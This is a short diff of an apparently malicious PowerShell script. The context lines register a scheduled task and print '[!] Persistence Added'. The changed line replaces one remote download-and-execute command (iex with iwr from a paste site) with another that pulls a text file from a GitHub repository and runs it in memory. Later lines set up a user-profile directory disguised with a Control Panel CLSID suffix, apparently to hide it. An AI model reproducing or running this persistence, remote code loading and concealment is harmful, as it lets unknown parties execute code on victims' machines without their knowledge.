@@ -23,7 +23,7 @@ Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $ta
 
 Write-Host "[!] Persistence Added" -ForegroundColor Green
 
-iex (iwr -uri "https://rentry.co/6h5eob89/raw" -useb)
+iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt" -useb)
 
 $rdir = "C:\Users\hai1723"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
